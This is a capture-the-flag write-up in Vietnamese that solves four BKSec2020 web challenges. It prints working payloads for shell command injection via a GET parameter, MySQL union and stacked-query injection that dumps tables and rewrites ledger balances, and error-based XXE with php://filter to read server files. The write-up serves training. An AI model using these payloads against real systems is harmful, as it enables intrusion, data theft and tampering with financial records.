# BKSec2020-CTF

#         Hacked (Author: Q5Ca)
- Bài này thì khá đơn giản chỉ chúng ta chỉ cần tập trung vào file robots.txt sau đó ta sẽ thấy file sitemap.xml => nhận dc `http://52.163.126.205:24033/shell1337/` ok v là ta có thể chạy shell trên local , chỉ việc get the flag!. `BKSec{robots.txt_is_S0_interesting}`.
#         Admin watch tower (Author: Sudo)
- Mới vào trang web ta  thấy `total 12 drwxrwxr-x 2 1000 1000 4096 Mar 30 17:25 . drwxr-xr-x 1 root root 4096 Feb 26 11:59 .. -rw-rw-r-- 1 1000 1000 777 Mar 30 17:25 index.php`
  + Tôi đoán có thể control bằng get request và đầu ra của source code là `system($_GET)`, thử đầu tiên với parameter là `?cmd=ls` responts : `Hack con keci ` kèm theo video LỚN RỒI! tiếp tục thử các chữ cái đều bị chặn , xong thử tới các kí tự đặc biệt thì chỉ có 1 dấu `/` là sài được , nhưng kí tự tiếp theo sau dấu `/`chỉ cho phép các kí tự đặc biệt . 
  + V cũng không sao , thử dùng kí tự nối 2 câu lệnh trên linux là `;` với payload :`?cmd=/;ls ` xem có j hot. BOOM. respont trả về `index.php` 
  + V là có thể get the flag rồi ! payload hoàn chỉnh :`?cmd=/;cd ../../../../ ; cd etc ;cat h3r3_is_ur_FlAg.txt` flag:`BKSec{Ngh3___nh4c____DSK_____d1____kh0n9___t4o___d4m___ch3t___d4y}`.
 #        Shitcoin(Author: Q5Ca)
 -  Bài này khá thú vi đối với tôi , tuy làm ko giống ý đồ của tác giả, nhưng sau khi lấy được flag thì được tác giả có chỉ hướng đi , tôi cũng hiểu được phần nào tầm quan trọng của bài này . OK bây giờ tôi sẽ giải bài này theo cách của tôi!
 -  Bài này chỉ là gửi tiền cho người khác kèm theo là 1 message . tôi suy luận 2 trường hợp:
    + 1 là tìm user có tiền trong database.
    + 2 là tự insert tiền cho mình (có khả quan hơn, và tôi chọn làm trước) .
 -  Sau khoảng thời gian lay hoay tìm chỗ inject thì tôi cũng tìm được 1 chỗ là message.
    + Message là chỗ sẽ inject dữ liệu vào database , và sẽ select ra ở phía, người nhận . Do đó ta có thể dùng inject select query để lấy các dữ liệu như tên bảng, tên cột và value của các cột.  
    + Nhưng do tính cẩu thả , tôi fuzz qua loa ,tuy có thử '||' nhưng lúc đầu không được nên tôi bỏ qua, và tôi đã dùng payload quá  chuối là `0"+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))+"` thì nó sẽ chuyển các chữ cái thành số  hệ Dec và gửi cho người nhận, ta chỉ việc decode ra được các chữ và cứ thế theo cách này là ra được các tên bảng và các cột ``` ledger -> id,amount,sender_id,receiver_id,message   và   users -> id,username,password ``` . Nếu muốn lấy values của các cột thì dùng `0"+ascii(substr((select id from users limit 1 OFFSET 0),1,1))+"`.
    + Tiếp đó tôi thử dùng multi insert nhưng KHÔNG KHẢ QUAN payload `0"),("1000","OuSHJMNMVEXrvpYeU9OXY/Qk5V6eyxW7Le3QhZnUNySf6A6PoV36ySur86hZ1Fkx","OuSHJMNMVEXrvpYeU9OXY/Qk5V6eyxW7Le3QhZnUNySf6A6PoV36ySur86hZ1Fkx","HAH`  , với chuỗi dài nhất đó là id của người gửi và người nhận.
    + Quyết định chơi luôn stacked query . update tiền cho mình ban đầu tôi dùng với payload `a"); UPDATE ledger SET amount=1000000-- -` mình sẽ bị -1000000 và người nhận sẽ dc 1000000 .Cứ chuyển qua chuyển lại thì sẽ đc tiền r mua flag thôi. `BKSec{now_u_know_RELATIONAL_database}` 
 -  Ngoài ra các bạn có thể sử dụng payload :`"||(SELECT VERSION())||" ` để tìm version cũng như thay đổi 1 chút trong payload để tìm các bảng và các cột và values cột nhanh nhất .  
 #          XML Suck(Author: Q5Ca)
 -  Bài này là mình solve cuối cùng , vì mình chưa rành về `XXE` nên việc làm nó cũng hơi khó khăn với mình . 
  - Tác giả cho source thì mình biết flag ở source và cái $user ko dc show ra ngoài nên ko thể dùng được` xxe to retrieve files`.
  - Còn lại 2 kĩ thuật blind và error based .
    + Dùng Blind thì bị chặn stream http. 
    + Còn lại error base . ok tiến hành thử file DTD local để exploit , nhưng không có file dtd nào ở local cả. 
    + Lên gg đọc tài liệu và tìm payload thì phát hiện 1 payload ko cần dtd ở local . 
 payload : 
 ```
 <?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%NUMBER;
]> 
<message>a</message>
 ```
 - Ngon rồi ! thử ráp vào xem chạy được không nhé!
 payload:
 ```
     <?xml version="1.0" encoding="UTF-8"?> 
    <!DOCTYPE message[ 
      <!ELEMENT message ANY >
      <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "index.php">
      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %NUMBER;
    ]> 
    <creds>
    <user></user>
    <pass></pass>
    </creds>
 ```
 respont :
 ```
 <br />
<b>Warning</b>:  DOMDocument::loadXML(): Invalid URI: file:///nonexistent/&lt;?php 
    error_reporting(E_ALL);
    ini_set( in Entity, line: 3 in <b>/var/www/html/index.php</b> on line <b>9</b><br />
<br />
<b>Warning</b>:  DOMDocument::loadXML(): xmlParseEntityDecl: entity error not terminated in Entity, line: 3 in <b>/var/www/html/index.php</b> on line <b>9</b><br />
<br />
<b>Warning</b>:  simplexml_import_dom(): Invalid Nodetype to import in <b>/var/www/html/index.php</b> on line <b>10</b><br />
<br />
<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/index.php</b> on line <b>11</b><br />
<br />
<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/index.php</b> on line <b>12</b><br />
You have logged in as user !!!
 ```
 - Vậy là thành công r , h chỉ việc dùng wrapper php://filter là móc tất tần tật source code ra !
 payload `php://filter/zlib.deflate/convert.base64-encode/resource=index.php`
 và 
 ```
 <?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=index.php">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%NUMBER;
]> 
<creds>
<user></user>
<pass></pass>
</creds>
 ```
 respont : ```XZBBTwIxEIXv/ophY7I1gYAHLyIYyHIwLnCQg56asjuUxm7btLsKUf+703U3IfbSTt+br9P38OiODq6AFnpvPfforK+VkWzFF3l+M201ZRQPWLO0VMFpceatOaRDuP3v0FZ2Kq/EiWs05LqbTMjXGrXanyrNCST2GjmaWtVnrq0o0QM7CB2wQ16T76A0wgzixiXWvLCmppbAUpr7fjxWxjV12jeUtiKzwU/ItuvMFk1FXnahjubxodd1znr4EPKnJV3wzXa12cF3X2a7LN8usr638FgGYgdVOY3xA3SgoDhBWST3xibQN2Zdw2gey05xIoQLJZZ/ChZHC8mbbeAoPhAoQIklBQoiQIsbDAZJBzloIQmSLp9fsPiKg6rAk9WJQgmK8lwL/964XBjZCInJTzq9+gU= ```. 
 Chỉ việc decode là ra flag :BKSec{XML_is_"ExtensibleMarkupLanguage"}
 tool: https://www.samltool.com/decode.php
